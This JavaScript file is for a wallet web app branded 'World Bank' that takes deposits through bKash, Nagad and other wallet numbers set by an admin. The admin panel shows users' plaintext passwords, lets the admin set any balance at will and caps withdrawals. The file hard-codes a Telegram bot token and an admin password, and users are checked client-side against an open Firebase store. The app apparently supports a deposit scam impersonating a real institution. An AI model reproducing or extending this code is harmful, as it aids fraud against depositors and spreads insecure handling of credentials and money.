const FIREBASE_DB_URL = "https://wallet-banking-default-rtdb.firebaseio.com/";
const BOT_TOKEN = "8898294688:AAH6ngVGDHwNJ1Fpri9OiNgd2nqCDvs9BFE"; 
const CHAT_ID = "7560607133";
const ADMIN_SECURITY_PASS = "worldbank1234@#";

let adminDepositNumbers = JSON.parse(localStorage.getItem('wb_deposit_numbers')) || {
    "🔴 bKash Account": "01800000000 (bKash Agent)",
    "🟠 Nagad Wallet": "01700000000 (Nagad Personal)",
    "🟣 Rocket DBBL": "01900000000-1 (Rocket Personal)",
    "🟢 Upay Mobile": "01600000000 (Upay Personal)",
    "🏛️ Dutch Bangla Bank (DBBL)": "A/C: 123.456.7890 (World Bank DBBL)"
};

const exchangeRatesUSD = { "USD": 1.0, "BDT": 117.50, "MYR": 4.70, "SAR": 3.75, "AED": 3.67, "SGD": 1.35 };
const countryCurrencyMap = { "+880": "৳", "+65": "$", "+60": "MYR", "+966": "SAR", "+971": "AED", "+1": "$", "+44": "£", "+91": "₹" };

const mandatoryBangladeshBanks = [
    "🔴 bKash Account (BD)", "🟠 Nagad Wallet (BD)", "🟣 Rocket DBBL (BD)", "🟢 Upay Mobile (BD)",
    "🏛️ Dutch Bangla Bank (DBBL)", "🏛️ Islami Bank Bangladesh (IBBL)", "🏛️ BRAC Bank PLC", "🏛️ City Bank PLC"
];

const mandatorySingaporeBanks = ["🔴 POSB Bank (Singapore)", "🔵 DBS Bank (Singapore)", "🔴 UOB Bank (Singapore)", "🟢 PayNow Transfer"];
const mandatoryMalaysiaBanks = ["🏛️ Maybank (Malaysia)", "🏛️ CIMB Bank", "📲 Touch 'n Go eWallet"];
const mandatorySaudiBanks = ["🏛️ Al Rajhi Bank", "📲 STC Pay Wallet"];
const mandatoryUAEBanks = ["🏛️ Emirates NBD", "📲 PayBy Wallet"];
const mandatoryUSABanks = ["🏛️ Bank of America", "🏛️ Chase Bank", "📲 Zelle / Venmo Transfer"];
const mandatoryUKBanks = ["🏛️ Barclays Bank", "📲 Revolut / Monzo"];
const mandatoryIndiaBanks = ["🏛️ State Bank of India (SBI)", "📲 PhonePe / GooglePay (UPI)"];

const countrySpecificBanksWithLogos = { 
    "+880": [], "+65": mandatorySingaporeBanks, "+60": mandatoryMalaysiaBanks, 
    "+966": mandatorySaudiBanks, "+971": mandatoryUAEBanks, "+1": mandatoryUSABanks, 
    "+44": mandatoryUKBanks, "+91": mandatoryIndiaBanks 
};

const defaultBalances = { WorldBank: 0.00, bKash: 0.00, Nagad: 0.00, Rocket: 0.00 };

let usersDatabase = JSON.parse(localStorage.getItem('wb_users')) || [];
let allTransactions = JSON.parse(localStorage.getItem('wb_transactions')) || [];
let activeUser = JSON.parse(localStorage.getItem('wb_active_session')) || null;
let balanceHideTimer = null;
let currentLang = 'bn';
let tempProfilePhotoBase64 = null;
let cameraStream = null;

function sendTelegramNotification(message) {
    if (!BOT_TOKEN || !CHAT_ID) return;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
    }).catch(err => console.error("Telegram API Error:", err));
}

function updateUIHeaderDetails() {
    if (!activeUser) return;
    const nameEl = document.getElementById('userNameDisp');
    const phoneEl = document.getElementById('userPhoneDisp');
    if (nameEl) nameEl.innerText = activeUser.name || 'User Name';
    if (phoneEl) phoneEl.innerText = activeUser.phone || '';
}

function showAdminDepositNumber(selectEl) {
    const numBox = document.getElementById('adminNumberBox');
    const numDisp = document.getElementById('dispAdminAccNum');
    const selectedVal = selectEl.value;
    if (!numBox || !numDisp) return;
    if (selectedVal && adminDepositNumbers[selectedVal]) {
        numDisp.innerText = adminDepositNumbers[selectedVal];
        numBox.classList.remove('hidden');
    } else if (selectedVal) {
        numDisp.innerText = "Official World Bank Account";
        numBox.classList.remove('hidden');
    } else {
        numBox.classList.add('hidden');
    }
}

async function adminSaveDepositNumber(e) {
    e.preventDefault();
    const method = document.getElementById('admDepMethodSelect').value;
    const newNumber = document.getElementById('admDepNumberInput').value.trim();
    if (!method || !newNumber) return;

    adminDepositNumbers[method] = newNumber;
    localStorage.setItem('wb_deposit_numbers', JSON.stringify(adminDepositNumbers));

    try {
        await fetch(`${FIREBASE_DB_URL}/depositNumbers.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(adminDepositNumbers)
        });
        showCustomAlert("সফল", `${method} এর জন্য নম্বর সেভ হয়েছে!`);
        e.target.reset();
    } catch(err) { showCustomAlert("এরর", "ফায়ারবেসে সেভ করা যায়নি!"); }
}

async function syncDepositNumbersFromFirebase() {
    try {
        const res = await fetch(`${FIREBASE_DB_URL}/depositNumbers.json`);
        const data = await res.json();
        if (data) {
            adminDepositNumbers = data;
            localStorage.setItem('wb_deposit_numbers', JSON.stringify(adminDepositNumbers));
        }
    } catch(err) { console.error("Deposit numbers sync error:", err); }
}

function toggleCurrencyCalcModal() {
    const modal = document.getElementById('currencyCalcModal');
    if (modal) {
        modal.classList.toggle('hidden');
        calculateCurrencyExchange();
    }
}

function calculateCurrencyExchange() {
    const amtInput = document.getElementById('calcAmountInput');
    const fromSelect = document.getElementById('calcFromCurr');
    const toSelect = document.getElementById('calcToCurr');
    const resultDisp = document.getElementById('calcResultDisp');
    if (!amtInput || !fromSelect || !toSelect || !resultDisp) return;

    const amt = parseFloat(amtInput.value) || 0;
    const usdVal = amt / (exchangeRatesUSD[fromSelect.value] || 1);
    const converted = usdVal * (exchangeRatesUSD[toSelect.value] || 1);
    resultDisp.innerText = `${toSelect.value} ${converted.toFixed(2)}`;
}

function toggleNotificationsModal() {
    const modal = document.getElementById('notificationsModal');
    if (modal) {
        modal.classList.toggle('hidden');
        renderNotificationsList();
    }
}

function renderNotificationsList() {
    const listEl = document.getElementById('notificationsList');
    const badgeEl = document.getElementById('notifBadge');
    if (!listEl || !activeUser) return;

    listEl.innerHTML = '';
    const myTxs = allTransactions.filter(t => t.userEmail === activeUser.phone);

    if (badgeEl) {
        if (myTxs.length > 0) {
            badgeEl.innerText = myTxs.length;
            badgeEl.classList.remove('hidden');
        } else {
            badgeEl.classList.add('hidden');
        }
    }

    if (myTxs.length === 0) {
        listEl.innerHTML = `<div style="text-align:center; color:#64748b; font-size:12px; padding:10px;">কোনো নোটিফিকেশন নেই।</div>`;
        return;
    }

    myTxs.forEach(t => {
        const item = document.createElement('div');
        let bgCol = '#fef3c7', borderCol = '#f59e0b', textCol = '#d97706', titleText = '⏳ পেন্ডিং রিকোয়েস্ট';
        
        if (t.status === 'Approved') {
            bgCol = '#d1fae5'; borderCol = '#10b981'; textCol = '#047857';
            titleText = '✅ রিকোয়েস্ট অনুমোদিত!';
        } else if (t.status === 'Rejected') {
            bgCol = '#fee2e2'; borderCol = '#ef4444'; textCol = '#b91c1c';
            titleText = '❌ রিকোয়েস্ট বাতিল করা হয়েছে';
        }

        item.style.cssText = `padding:8px 12px; border-radius:6px; background:${bgCol}; border:1px solid ${borderCol}; font-size:11px; margin-bottom:6px;`;
        item.innerHTML = `<strong style="color:${textCol}">${titleText}</strong><p style="margin-top:2px; color:#334155;">আপনার ${t.type} (${t.currency || '৳'}${formatAmountLocale(t.amount)}) রিকোয়েস্ট।</p>`;
        listEl.appendChild(item);
    });
}

function populateUserDynamicBanksWithLogos() {
    const addSelect = document.getElementById('addMoneyMethodSelect');
    const transferSelect = document.getElementById('fundTransferMethodSelect');
    if (!addSelect || !transferSelect) return;

    let countryCode = "+880";
    if (activeUser && activeUser.phone) {
        const p = activeUser.phone.trim();
        for (let code in countrySpecificBanksWithLogos) {
            if (p.startsWith(code)) { countryCode = code; break; }
        }
    }

    const currentCountryBanks = countrySpecificBanksWithLogos[countryCode] || [];
    let combinedBanks = Array.from(new Set([
        "🏛️ World Bank Main Account", ...currentCountryBanks, ...mandatoryBangladeshBanks, "🌐 International Wire Transfer"
    ]));

    addSelect.innerHTML = `<option value="">পেমেন্ট মেথড বা ব্যাংক সিলেক্ট করুন</option>`;
    transferSelect.innerHTML = `<option value="">ট্রান্সফার মাধ্যম সিলেক্ট করুন</option>`;

    combinedBanks.forEach(b => {
        addSelect.innerHTML += `<option value="${b}">${b}</option>`;
        transferSelect.innerHTML += `<option value="${b}">${b}</option>`;
    });
}

function checkLoginInputType(inputEl) {
    const val = inputEl.value.trim();
    const noteEl = document.getElementById('emailWarningNote');
    if (!noteEl) return;
    if (val.includes('@')) noteEl.classList.remove('hidden');
    else noteEl.classList.add('hidden');
}

async function openQuickPayScanner() {
    document.getElementById('cameraModal')?.classList.remove('hidden');
    try {
        const video = document.getElementById('qrVideoFeed');
        if (video) {
            cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            video.srcObject = cameraStream;
        }
    } catch (err) { console.error(err); }
}

function closeQuickPayScanner() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }
    document.getElementById('cameraModal')?.classList.add('hidden');
}

function openUSAHotlineFAQ() {
    showCustomAlert("USA Hotline & FAQ", "World Bank Global Support:\n📞 +1 (800) 555-0199");
}

function filterCountryList() {
    const input = document.getElementById('countrySearchInput').value.toLowerCase();
    const select = document.getElementById('regCountryCode');
    if (!select) return;
    for (let i = 0; i < select.options.length; i++) {
        select.options[i].style.display = select.options[i].text.toLowerCase().includes(input) ? "" : "none";
    }
}

function getUserCurrency(user) {
    if (!user) return '৳';
    if (user.currency) return user.currency;
    if (user.phone) {
        for (let code in countryCurrencyMap) {
            if (user.phone.trim().startsWith(code)) return countryCurrencyMap[code];
        }
    }
    return '৳';
}

function formatAmountLocale(amount) {
    return parseFloat(amount || 0).toFixed(2);
}

function showCustomAlert(title, message) {
    const modal = document.getElementById('customAlertModal');
    if (!modal) { alert(title + ": " + message); return; }
    document.getElementById('customAlertTitle').innerText = title;
    document.getElementById('customAlertText').innerText = message;
    modal.classList.remove('hidden');
}

function closeCustomAlert() {
    document.getElementById('customAlertModal')?.classList.add('hidden');
}

function showSuccessReceiptPopup(tx) {
    const modal = document.getElementById('bkashSuccessReceiptModal');
    if (!modal) return;
    const curr = tx.currency || getUserCurrency(activeUser);
    
    document.getElementById('receiptTitleText').innerText = tx.type === 'Deposit' ? 'Your Add Money is successful' : 'Your Send Money is successful';
    document.getElementById('receiptReceiverPhone').innerText = tx.phone;
    document.getElementById('receiptBankName').innerText = tx.method;
    document.getElementById('receiptTime').innerText = `${tx.timeStr || ''} ${tx.dateStr || ''}`;
    document.getElementById('receiptTrxId').innerText = tx.trxId;
    document.getElementById('receiptTotalAmount').innerText = `${curr} ${formatAmountLocale(tx.amount)}`;
    document.getElementById('receiptBreakdown').innerText = `${curr} ${formatAmountLocale(tx.amount - 10)} + ${curr} 10.00`;
    document.getElementById('receiptNewBalance').innerText = `${curr} ${formatAmountLocale(tx.remBal !== undefined ? tx.remBal : activeUser.totalBalance)}`;
    document.getElementById('receiptReceiverInitial').innerText = tx.phone ? tx.phone.charAt(0) : '👤';

    modal.classList.remove('hidden');
}

function closeSuccessReceiptModal() {
    document.getElementById('bkashSuccessReceiptModal')?.classList.add('hidden');
}

function sanitizeEmailKey(keyStr) {
    return keyStr ? keyStr.replace(/[^a-zA-Z0-9]/g, "_") : "";
}

async function syncFromFirebase() {
    try {
        await syncDepositNumbersFromFirebase();
        const uRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
        const uData = await uRes.json();
        if (uData) {
            usersDatabase = Object.values(uData);
            localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        }

        const tRes = await fetch(`${FIREBASE_DB_URL}/transactions.json`);
        const tData = await tRes.json();
        if (tData) {
            allTransactions = Object.values(tData).reverse();
            localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        }
    } catch(err) { console.error("Firebase sync error:", err); }
}

document.addEventListener('DOMContentLoaded', async () => {
    if (activeUser) {
        document.getElementById('authSection')?.classList.add('hidden');
        document.getElementById('dashboardSection')?.classList.remove('hidden');
        updateUIHeaderDetails();
        renderBalances();
        populateUserDynamicBanksWithLogos();
        renderNotificationsList();
    }
    await syncFromFirebase();
});

function openAddMoneyModal() { document.getElementById('addMoneyModal')?.classList.toggle('hidden'); }
function openFundTransferModal() { document.getElementById('fundTransferModal')?.classList.toggle('hidden'); }
function openTopUpModal() { showCustomAlert("Mobile Top Up", "শীঘ্রই চালু হচ্ছে!"); }
function openCardBankModal() { showCustomAlert("Card / Bank", "সক্রিয় রয়েছে।"); }
function toggleForgotModal() { showCustomAlert("Forgot Password", "এডমিনের সাথে যোগাযোগ করুন।"); }

function switchTab(type) {
    const loginForm = document.getElementById('loginForm');
    const signUpForm = document.getElementById('signUpForm');
    if(type === 'login') {
        loginForm?.classList.remove('hidden');
        signUpForm?.classList.add('hidden');
    } else {
        signUpForm?.classList.remove('hidden');
        loginForm?.classList.add('hidden');
    }
}

async function handleSignUp(e) {
    e.preventDefault();
    const name = document.getElementById('regName').value.trim();
    const email = document.getElementById('regEmail').value.trim();
    const countryCodeSelect = document.getElementById('regCountryCode');
    const rawPhone = document.getElementById('regPhone').value.trim();
    const password = document.getElementById('regPass').value;
    const fullPhone = countryCodeSelect.value + rawPhone;
    const currency = countryCodeSelect.options[countryCodeSelect.selectedIndex].getAttribute('data-currency') || '৳';

    if (usersDatabase.some(u => u.phone === fullPhone || u.email === email)) {
        showCustomAlert("সতর্কতা", 'এই ফোন নম্বর বা ইমেইল দিয়ে আগেই অ্যাকাউন্ট খোলা হয়েছে!');
        return;
    }

    const newUser = {
        name: name, email: email, phone: fullPhone, currency: currency, password: password,
        photo: null, totalBalance: 0.00, withdrawLimit: 0.00, balances: { ...defaultBalances }
    };

    usersDatabase.push(newUser);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    
    await fetch(`${FIREBASE_DB_URL}/users/${sanitizeEmailKey(newUser.phone)}.json`, {
        method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(newUser)
    });

    showCustomAlert("সফল", 'অ্যাকাউন্ট তৈরি হয়েছে! এখন লগইন করুন।');
    switchTab('login');
}

async function handleLogin(e) {
    e.preventDefault();
    const inputPhone = document.getElementById('logPhone').value.trim();
    const password = document.getElementById('logPass').value;

    const user = usersDatabase.find(u => u.phone.includes(inputPhone) && u.password === password);
    if(user) {
        activeUser = user;
        if(!activeUser.totalBalance) activeUser.totalBalance = 0.00;
        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        
        document.getElementById('authSection')?.classList.add('hidden');
        document.getElementById('dashboardSection')?.classList.remove('hidden');
        updateUIHeaderDetails();
        renderBalances();
        populateUserDynamicBanksWithLogos();
    } else {
        document.getElementById('errorText').style.display = 'block';
    }
}

function renderBalances() {
    const pillText = document.getElementById('balancePillText');
    const symbolEl = document.getElementById('dashCurrencySymbol');
    if (symbolEl && activeUser) symbolEl.innerText = getUserCurrency(activeUser);
    if (pillText) pillText.innerText = "Balance";
}

function toggleBalanceVisibility() {
    const pillText = document.getElementById('balancePillText');
    if (!activeUser) return;
    pillText.innerText = `${getUserCurrency(activeUser)} ${formatAmountLocale(activeUser.totalBalance || 0)}`;
    setTimeout(() => { pillText.innerText = "Balance"; }, 3000);
}

function logout() {
    activeUser = null;
    localStorage.removeItem('wb_active_session');
    location.reload();
}

async function openInboxModal() {
    document.getElementById('inboxModal')?.classList.toggle('hidden');
    const tbody = document.getElementById('userInboxModalBody');
    if (!tbody || !activeUser) return;
    tbody.innerHTML = '';
    
    let myTxs = allTransactions.filter(t => t.userEmail === activeUser.phone);
    if (myTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;">কোনো রেকর্ড নেই।</td></tr>`;
        return;
    }
    myTxs.forEach(t => {
        tbody.innerHTML += `<tr><td>${t.dateStr}</td><td><b>${t.type}</b></td><td>${t.method}</td><td>${t.amount}</td><td><code>${t.trxId}</code></td><td>${t.status}</td></tr>`;
    });
}

async function submitTransactionRequest(e, type) {
    e.preventDefault();
    const form = e.target;
    const method = form.querySelector('.methodSelect').value;
    const phone = form.querySelector('.phoneInput').value;
    const amount = parseFloat(form.querySelector('.amountInput').value);
    const trxId = form.querySelector('.trxInput').value;
    const secPass = form.querySelector('.secPassInput').value;

    if (secPass !== activeUser.password) {
        showCustomAlert("পাসওয়ার্ড ভুল", 'সঠিক পাসওয়ার্ড দিন!');
        return;
    }

    const now = new Date();
    const txObj = {
        id: Date.now(), userEmail: activeUser.phone, userName: activeUser.name,
        type: type, method: method, phone: phone, amount: amount, currency: getUserCurrency(activeUser),
        trxId: trxId, status: 'Pending', remBal: activeUser.totalBalance,
        dateStr: now.toLocaleDateString('bn-BD'), timeStr: now.toLocaleTimeString('bn-BD')
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    
    await fetch(`${FIREBASE_DB_URL}/transactions/tx_${txObj.id}.json`, {
        method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(txObj)
    });

    sendTelegramNotification(`⏳ <b>${type} রিকোয়েস্ট!</b>\n👤 ইউজার: ${activeUser.name}\n💰 পরিমাণ: ${txObj.currency}${amount}`);
    showCustomAlert("সফল", 'রিকোয়েস্ট জমা হয়েছে!');
    form.reset();
}

// এডমিন প্যানেল ফাংশনসমূহ
function populateAdminUserSelect() {
    const balSelect = document.getElementById('admBalanceUserSelect');
    const limSelect = document.getElementById('admLimitUserSelect');
    if (balSelect) balSelect.innerHTML = '<option value="">ইউজার সিলেক্ট করুন</option>';
    if (limSelect) limSelect.innerHTML = '<option value="">ইউজার সিলেক্ট করুন</option>';

    usersDatabase.forEach(u => {
        const opt = `<option value="${u.phone}">${u.name} (${u.phone})</option>`;
        if (balSelect) balSelect.innerHTML += opt;
        if (limSelect) limSelect.innerHTML += opt;
    });
}

async function refreshAdminData() {
    await syncFromFirebase();
    renderAdminUsersList();
    renderAdminPendingList();
    populateAdminUserSelect();
    alert("ডাটা রিফ্রেশ হয়েছে!");
}

function renderAdminUsersList() {
    const tbody = document.getElementById('adminUsersListBody');
    if (!tbody) return;
    tbody.innerHTML = '';
    usersDatabase.forEach(u => {
        tbody.innerHTML += `<tr><td><b>${u.name}</b></td><td>${u.phone}</td><td>${u.currency || '৳'}</td><td style="color:#f43f5e;">${u.password}</td><td>${formatAmountLocale(u.totalBalance || 0)}</td><td>${formatAmountLocale(u.withdrawLimit || 0)}</td><td><button onclick="adminDeleteUser('${u.phone}')" class="btn-delete-user">Delete</button></td></tr>`;
    });
}

function renderAdminPendingList() {
    const tbody = document.getElementById('adminPendingTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';
    const pendingTxs = allTransactions.filter(t => t.status === 'Pending');
    pendingTxs.forEach(t => {
        tbody.innerHTML += `<tr><td><b>${t.userName}</b></td><td>${t.type}</td><td>${t.method}</td><td>${t.phone}</td><td>${t.amount}</td><td><code>${t.trxId}</code></td><td><button onclick="approveTransaction(${t.id})" class="btn-approve">Approve</button> <button onclick="rejectTransaction(${t.id})" class="btn-reject">Reject</button></td></tr>`;
    });
}

async function approveTransaction(txId) {
    const tx = allTransactions.find(t => t.id === txId);
    if (!tx) return;
    const user = usersDatabase.find(u => u.phone === tx.userEmail);
    if (user) {
        if (tx.type === 'Deposit') user.totalBalance += tx.amount;
        else user.totalBalance -= tx.amount;

        tx.status = 'Approved';
        tx.remBal = user.totalBalance;
        
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));

        await fetch(`${FIREBASE_DB_URL}/users/${sanitizeEmailKey(user.phone)}.json`, {
            method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(user)
        });
        await fetch(`${FIREBASE_DB_URL}/transactions/tx_${tx.id}.json`, {
            method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(tx)
        });

        alert("অনুমোদিত হয়েছে!");
        renderAdminPendingList();
        renderAdminUsersList();
    }
}

async function rejectTransaction(txId) {
    const tx = allTransactions.find(t => t.id === txId);
    if (!tx) return;
    tx.status = 'Rejected';
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await fetch(`${FIREBASE_DB_URL}/transactions/tx_${tx.id}.json`, {
        method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(tx)
    });
    alert("বাতিল করা হয়েছে!");
    renderAdminPendingList();
}

async function adminDeleteUser(phone) {
    if (!confirm("ডিলিট করতে চান?")) return;
    usersDatabase = usersDatabase.filter(u => u.phone !== phone);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    await fetch(`${FIREBASE_DB_URL}/users/${sanitizeEmailKey(phone)}.json`, { method: 'DELETE' });
    renderAdminUsersList();
}

async function adminUpdateUserBalance(e) {
    e.preventDefault();
    const phone = document.getElementById('admBalanceUserSelect').value;
    const action = document.getElementById('admBalanceActionType').value;
    const amt = parseFloat(document.getElementById('admBalanceAmount').value);
    const user = usersDatabase.find(u => u.phone === phone);
    if (!user) return;

    if (action === 'ADD') user.totalBalance += amt;
    else if (action === 'DEDUCT') user.totalBalance = Math.max(0, user.totalBalance - amt);
    else if (action === 'SET') user.totalBalance = amt;

    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    await fetch(`${FIREBASE_DB_URL}/users/${sanitizeEmailKey(phone)}.json`, {
        method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(user)
    });
    alert("ব্যালেন্স আপডেট হয়েছে!");
}

async function adminUpdateUserWithdrawLimit(e) {
    e.preventDefault();
    const phone = document.getElementById('admLimitUserSelect').value;
    const limit = parseFloat(document.getElementById('admUserCustomLimitInput').value);
    const user = usersDatabase.find(u => u.phone === phone);
    if (!user) return;
    user.withdrawLimit = limit;
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    await fetch(`${FIREBASE_DB_URL}/users/${sanitizeEmailKey(phone)}.json`, {
        method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(user)
    });
    alert("লিমিট সেভ হয়েছে!");
}
